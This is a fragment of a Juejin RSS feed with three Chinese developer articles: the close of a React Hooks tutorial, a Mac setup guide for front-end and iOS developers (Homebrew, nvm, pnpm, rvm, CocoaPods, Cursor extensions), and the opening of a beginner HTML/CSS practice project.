<h3 data-id="heading-64">🎨 组件设计</h3>
<ol>
<li><strong>单一职责</strong>：每个组件只做一件事</li>
<li><strong>Props 最小化</strong>：只传递必要的 props</li>
<li><strong>组合优于继承</strong>：使用组合构建复杂组件</li>
</ol>
<h3 data-id="heading-65">🔧 Hooks 设计</h3>
<ol>
<li><strong>关注点分离</strong>：将相关逻辑放在一个 Hook 中</li>
<li><strong>返回对象</strong>：便于解构使用</li>
<li><strong>提供清理函数</strong>：避免副作用导致的内存泄漏</li>
</ol>
<h3 data-id="heading-66">📊 性能优化</h3>
<ol>
<li><strong>使用 useMemo 缓存计算结果</strong></li>
<li><strong>使用 useCallback 缓存函数</strong></li>
<li><strong>合理使用依赖数组</strong></li>
<li><strong>避免不必要的渲染</strong></li>
</ol>
<h2 data-id="heading-67">🎊 十、总结</h2>
<p>React Hooks 是 React 开发的核心特性，它通过函数式编程思想，让我们能够更优雅地管理组件状态和副作用。</p>
<p><strong>核心要点回顾：</strong></p>
<ul>
<li><strong>useState</strong>：管理组件状态</li>
<li><strong>useEffect</strong>：处理副作用，包括清理函数防止内存泄漏</li>
<li><strong>useContext</strong>：跨层级传递数据</li>
<li><strong>useRef</strong>：访问 DOM 和保存可变值</li>
<li><strong>自定义 Hooks</strong>：逻辑复用，提高代码可维护性</li>
</ul>
<p>通过合理使用 Hooks，我们可以编写出更简洁、更易维护、更易测试的 React 代码。Hooks 让函数组件拥有了类组件的所有能力，同时避免了类组件的复杂性和 <code>this</code> 绑定问题。</p>
<p>在实际开发中，遵循 Hooks 的使用规则，合理设计自定义 Hooks，充分利用 React 生态中的各种 Hooks，将大大提升开发效率和代码质量。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[前端/iOS开发者必备工具软件合集]]></title>    <link>https://juejin.cn/post/7605530057176743979</link>    <guid>https://juejin.cn/post/7605530057176743979</guid>    <pubDate>2026-02-12T12:00:33.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605530057176743979" data-draft-id="7605800124882911238" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="前端/iOS开发者必备工具软件合集"/> <meta itemprop="keywords" content="前端,iOS"/> <meta itemprop="datePublished" content="2026-02-12T12:00:33.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="芝加哥兔兔养殖场"/> <meta itemprop="url" content="https://juejin.cn/user/4001878055060264"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            前端/iOS开发者必备工具软件合集
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4001878055060264/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    芝加哥兔兔养殖场
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-12T12:00:33.000Z" title="Thu Feb 12 2026 12:00:33 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    4
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>近期新购入了一款 Mac，趁此机会重装了一遍所有软件，记录一下程序员必备软件合集，方便下次换机或新同事参考。</p>
</blockquote>
<hr/>
<h2 data-id="heading-0">一、环境与包管理（安装顺序建议）</h2>
<h3 data-id="heading-1">1. Homebrew</h3>
<p>Mac 的包管理器，建议最先安装，后续很多软件可通过它一键安装。</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 安装（官方一键脚本）</span>
/bin/bash -c <span class="hljs-string">"<span class="hljs-subst">$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)</span>"</span>
<span class="hljs-comment"># 安装后按提示把 brew 加入 PATH（Apple Silicon 常见路径）</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">'eval "$(/opt/homebrew/bin/brew shellenv)"'</span> &gt;&gt; ~/.zprofile &amp;&amp; <span class="hljs-built_in">eval</span> <span class="hljs-string">"<span class="hljs-subst">$(/opt/homebrew/bin/brew shellenv)</span>"</span>
</code></pre>
<p><strong>常用技巧：</strong></p>
<ul>
<li><code>brew install &lt;包名&gt;</code>：安装软件</li>
<li><code>brew upgrade</code>：升级所有已安装包</li>
<li><code>brew search &lt;关键词&gt;</code>：搜索可用包</li>
<li><code>brew list</code>：查看已安装列表</li>
<li><code>brew cleanup</code>：清理旧版本缓存</li>
<li><code>brew cask install &lt;应用&gt;</code>：安装图形界面应用（如 Chrome、Cursor）</li>
</ul>
<hr/>
<h3 data-id="heading-2">2. nvm（Node 版本管理）</h3>
<p>多项目可能依赖不同 Node 版本，用 nvm 切换很方便。</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 使用 Homebrew 安装</span>
brew install nvm
<span class="hljs-comment"># 在 ~/.zshrc 中加入（如用 Oh My Zsh 则编辑该文件）</span>
<span class="hljs-built_in">export</span> NVM_DIR=<span class="hljs-string">"<span class="hljs-variable">$HOME</span>/.nvm"</span>
[ -s <span class="hljs-string">"/opt/homebrew/opt/nvm/nvm.sh"</span> ] &amp;&amp; \. <span class="hljs-string">"/opt/homebrew/opt/nvm/nvm.sh"</span>
[ -s <span class="hljs-string">"/opt/homebrew/opt/nvm/etc/bash_completion.d/nvm"</span> ] &amp;&amp; \. <span class="hljs-string">"/opt/homebrew/opt/nvm/etc/bash_completion.d/nvm"</span>
<span class="hljs-comment"># 然后执行 source ~/.zshrc</span>
</code></pre>
<p><strong>常用技巧：</strong></p>
<ul>
<li>
<p><code>nvm install 20</code>：安装 Node 20 最新版</p>
</li>
<li>
<p><code>nvm use 18</code>：当前终端切换到 Node 18</p>
</li>
<li>
<p><code>nvm alias default 20</code>：默认使用 Node 20</p>
</li>
<li>
<p><code>nvm ls</code>：查看已安装版本</p>
</li>
<li>
<p>项目根目录放 <code>.nvmrc</code> 写版本号（如 <code>20</code>），在目录下执行 <code>nvm use</code> 即可自动切换</p>
</li>
<li>
<p>技巧2<br/>
在.nvmrc 中写入当前支持的node版本号<code>node -v &gt; .nvmrc</code></p>
</li>
</ul>
<pre><code class="hljs language-ruby" lang="ruby">autoload -U add-zsh-hook
load-nvmrc() {
  local nvmrc_path
  nvmrc_path=<span class="hljs-string">"$(nvm_find_nvmrc)"</span>

  <span class="hljs-keyword">if</span> [ -n <span class="hljs-string">"$nvmrc_path"</span> ]; <span class="hljs-keyword">then</span>
    local nvmrc_node_version
    nvmrc_node_version=<span class="hljs-variable">$(</span>nvm version <span class="hljs-string">"$(cat "</span><span class="hljs-variable">${</span>nvmrc_path}<span class="hljs-string">")"</span>)

    <span class="hljs-keyword">if</span> [ <span class="hljs-string">"$nvmrc_node_version"</span> = <span class="hljs-string">"N/A"</span> ]; <span class="hljs-keyword">then</span>
      nvm install
    elif [ <span class="hljs-string">"$nvmrc_node_version"</span> != <span class="hljs-string">"$(nvm version)"</span> ]; <span class="hljs-keyword">then</span>
      nvm use
    fi
  elif [ <span class="hljs-string">"$(nvm version)"</span> != <span class="hljs-string">"$(nvm version default)"</span> ]; <span class="hljs-keyword">then</span>
    <span class="hljs-comment"># 离开有 .nvmrc 的目录，切回默认版本</span>
    echo <span class="hljs-string">"Reverting to nvm default version"</span>
    nvm use default
  fi
}
add-zsh-hook chpwd load-nvmrc
load-nvmrc
</code></pre>
<p>即可实现切换到当前文件自动切换到对应的node版本</p>
<hr/>
<h3 data-id="heading-3">3. pnpm</h3>
<p>比 npm 更快、省磁盘，适合 Monorepo 和前端项目。</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 安装（建议在配置好 nvm 后执行，全局安装到当前 Node）</span>
npm install -g pnpm
<span class="hljs-comment"># 或使用 Homebrew</span>
brew install pnpm
</code></pre>
<p><strong>常用技巧：</strong></p>
<ul>
<li><code>pnpm install</code>：安装依赖（会严格按 workspace 和 lockfile）</li>
<li><code>pnpm add &lt;包名&gt;</code> / <code>pnpm add -D &lt;包名&gt;</code>：添加依赖 / 开发依赖</li>
<li><code>pnpm run &lt;script&gt;</code> 或 <code>pnpm &lt;script&gt;</code>：运行 package.json 里脚本</li>
<li><code>pnpm store path</code>：查看全局 store 目录；<code>pnpm store prune</code>：清理未引用包</li>
<li>在项目里用 <code>pnpm</code> 前可先 <code>corepack enable</code> 再 <code>corepack prepare pnpm@latest --activate</code>，便于团队统一 pnpm 版本</li>
</ul>
<hr/>
<h3 data-id="heading-4">4. rvm + CocoaPods</h3>
<p>iOS/macOS 开发常用 Ruby 环境管理 + 依赖管理。</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 安装 rvm</span>
curl -sSL https://get.rvm.io | bash -s stable
<span class="hljs-built_in">source</span> ~/.rvm/scripts/rvm

<span class="hljs-comment"># 安装 Ruby（建议 3.x，与 CocoaPods 兼容好）</span>
rvm install 3.2.0
rvm use 3.2.0 --default

<span class="hljs-comment"># 安装 CocoaPods</span>
sudo gem install cocoapods -n /usr/local/bin
</code></pre>
<p><strong>常用技巧：</strong></p>
<ul>
<li><strong>rvm</strong>
<ul>
<li><code>rvm list</code>：已安装 Ruby 列表</li>
<li><code>rvm use 3.2.0</code>：切换版本</li>
<li>项目目录放 <code>.ruby-version</code> 可自动切换</li>
</ul>
</li>
<li><strong>CocoaPods</strong>
<ul>
<li><code>pod init</code>：在 Xcode 工程目录下初始化 Podfile</li>
<li><code>pod install</code>：安装/更新依赖（之后用 <code>.xcworkspace</code> 打开工程）</li>
<li><code>pod update &lt;库名&gt;</code>：更新指定库</li>
<li><code>pod repo update</code>：更新 CocoaPods 官方 spec 仓库（卡住时常用）</li>
<li>国内镜像若慢，可在 Podfile 顶部指定 source，或使用 CDN 源</li>
</ul>
</li>
</ul>
<hr/>
<h2 data-id="heading-5">二、必备软件列表</h2>




























































<table><thead><tr><th>类型</th><th>软件</th><th>说明</th></tr></thead><tbody><tr><td>浏览器</td><td>Chrome</td><td>开发、调试、日常</td></tr><tr><td>终端</td><td>iTerm2 + Oh My Zsh</td><td>更好用的终端与 shell 配置</td></tr><tr><td>抓包/调试</td><td>Proxyman</td><td>macOS 抓包、证书、代理</td></tr><tr><td>开发</td><td>Xcode</td><td>iOS/macOS 开发必备</td></tr><tr><td>编辑器</td><td>Cursor</td><td>AI 辅助编码</td></tr><tr><td>系统监控</td><td>iStat Menus</td><td>菜单栏 CPU/内存/网速等</td></tr><tr><td>数据库</td><td>TablePlus</td><td>多数据库客户端</td></tr><tr><td>截图</td><td>iShot</td><td>截图、标注、录屏</td></tr><tr><td>远程</td><td>Termius</td><td>SSH 等远程连接</td></tr><tr><td>JSON</td><td>OK JSON</td><td>JSON 查看工具</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-6">三、Cursor 已安装插件</h2>
<p>当前 Cursor 中已安装的扩展（便于换机或重装时恢复）：</p>













































































<table><thead><tr><th>扩展 ID</th><th>说明</th></tr></thead><tbody><tr><td><code>bradlc.vscode-tailwindcss</code></td><td>Tailwind CSS IntelliSense（类名补全、预览）</td></tr><tr><td><code>christian-kohler.npm-intellisense</code></td><td>npm 包名/版本补全</td></tr><tr><td><code>christian-kohler.path-intellisense</code></td><td>路径补全（import、src 等）</td></tr><tr><td><code>dbaeumer.vscode-eslint</code></td><td>ESLint 代码检查</td></tr><tr><td><code>dsznajder.es7-react-js-snippets</code></td><td>ES7+ React/Redux 代码片段</td></tr><tr><td><code>eamodio.gitlens</code></td><td>Git 增强（行历史、blame、对比等）</td></tr><tr><td><code>esbenp.prettier-vscode</code></td><td>Prettier 格式化</td></tr><tr><td><code>formulahendry.auto-rename-tag</code></td><td>自动重命名配对的 HTML/JSX 标签</td></tr><tr><td><code>ms-ceintl.vscode-language-pack-zh-hans</code></td><td>中文（简体）语言包</td></tr><tr><td><code>pkief.material-icon-theme</code></td><td>Material 风格文件/文件夹图标</td></tr><tr><td><code>ritwickdey.liveserver</code></td><td>本地 Live Server 前端预览</td></tr><tr><td><code>steoates.autoimport</code></td><td>自动补全并插入 import</td></tr><tr><td><code>stylelint.vscode-stylelint</code></td><td>CSS/SCSS/Less 的 Stylelint 检查</td></tr><tr><td><code>tomi.xasnippets</code></td><td>Xcode 风格代码片段（iOS 开发）</td></tr><tr><td><code>usernamehw.errorlens</code></td><td>行内显示错误/警告（Error Lens）</td></tr><tr><td><code>wallabyjs.console-ninja</code></td><td>Console Ninja（控制台日志增强）</td></tr><tr><td><code>yzhang.markdown-all-in-one</code></td><td>Markdown 编辑与预览增强</td></tr></tbody></table>
<p><strong>一键安装（在 Cursor 终端执行）：</strong></p>
<pre><code class="hljs language-bash" lang="bash">cursor --install-extension bradlc.vscode-tailwindcss
cursor --install-extension christian-kohler.npm-intellisense
cursor --install-extension christian-kohler.path-intellisense
cursor --install-extension dbaeumer.vscode-eslint
cursor --install-extension dsznajder.es7-react-js-snippets
cursor --install-extension eamodio.gitlens
cursor --install-extension esbenp.prettier-vscode
cursor --install-extension formulahendry.auto-rename-tag
cursor --install-extension ms-ceintl.vscode-language-pack-zh-hans
cursor --install-extension pkief.material-icon-theme
cursor --install-extension ritwickdey.liveserver
cursor --install-extension steoates.autoimport
cursor --install-extension stylelint.vscode-stylelint
cursor --install-extension tomi.xasnippets
cursor --install-extension usernamehw.errorlens
cursor --install-extension wallabyjs.console-ninja
cursor --install-extension yzhang.markdown-all-in-one
</code></pre>
<hr/>
<h2 data-id="heading-7">四、后续可补充</h2>
<ul>
<li>各软件的偏好设置或快捷键</li>
<li>常用 Xcode 配置（证书、模拟器、Build Settings 等）</li>
<li>团队统一的 <code>.nvmrc</code>、<code>.ruby-version</code>、编辑器推荐插件配置（如放入仓库 <code>.vscode/extensions.json</code>）</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[学成在线 案例练习]]></title>    <link>https://juejin.cn/post/7605769126270976046</link>    <guid>https://juejin.cn/post/7605769126270976046</guid>    <pubDate>2026-02-12T12:07:28.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605769126270976046" data-draft-id="7604793276907159615" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="学成在线 案例练习"/> <meta itemprop="keywords" content="前端,CSS"/> <meta itemprop="datePublished" content="2026-02-12T12:07:28.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="糖糖TANG"/> <meta itemprop="url" content="https://juejin.cn/user/1444125077668092"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            学成在线 案例练习
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1444125077668092/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    糖糖TANG
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-12T12:07:28.000Z" title="Thu Feb 12 2026 12:07:28 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读11分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>大家好，我是糖糖～最近我跟着 b 站 pink 老师做了学成在线的案例练习，收获满满，今天就来和大家分享一下我的学习过程与心得，一起开启技术学习新旅程！</p>
<h2 data-id="heading-0">一.案例准备工作</h2>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
A[创建study目录文件夹] --&gt; B[在vscode打开目录文件夹]
B --&gt; C[study目录内新建images文件夹]
C --&gt; D[新建首页文件index.html]
D --&gt; E[新建style.css样式文件采用外链样式]
E --&gt; F[样式表写入清除内外边距的样式来检验样式表是否引入成功]
</code></pre>
<p>index.html:!符号+Tab键生成模板，link+Taba键添加外链样式；</p>
<p>body里随机写入内容用于测试引入是否成功</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>学成在线首页<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"stylesheet"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"style.css"</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
    123
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/14f910e9ae88449982b90995bfaece9e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg57OW57OWVEFORw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771502848&amp;x-signature=wiaIpr%2FOafO1gxL2Q0xSVFlnUXE%3D" alt="image.png" loading="lazy"/>
样式文件去除内外边距，代码如下</p>
<pre><code class="hljs language-css" lang="css">* {
    <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span>;
    <span class="hljs-attribute">padding</span>: <span class="hljs-number">0</span>;
}
</code></pre>
